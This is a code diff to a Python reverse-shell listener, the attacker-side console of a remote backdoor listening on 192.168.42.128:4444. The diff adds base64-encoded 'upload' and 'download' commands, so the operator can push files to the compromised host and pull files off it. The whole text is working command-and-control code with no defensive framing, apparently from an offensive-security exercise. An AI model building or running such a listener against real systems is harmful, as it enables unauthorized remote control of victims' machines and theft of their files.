@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import socket, json
+import socket, json, base64
 
 class Listener:
 
@@ -28,19 +28,37 @@ class Listener:
 
     def execute_remotely(self, command):
           self.reliable_send(command)
-          
+
           if command[0] == "exit":
               self.connection.close()
               exit()
           
           return self.realiable_receive()
+    
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content.encode()))
+            return "[+] Download successful"
+        
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
 
     #run
     def run(self):
         while True:
             command = input(">> ")
             command = command.split(" ")
+
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content.decode())
+
             result = self.execute_remotely(command)
+
+            if command[0] == "download":
+                result = self.write_file(command[1], result)
+
             print(result)
 
 my_listener = Listener("192.168.42.128", 4444)
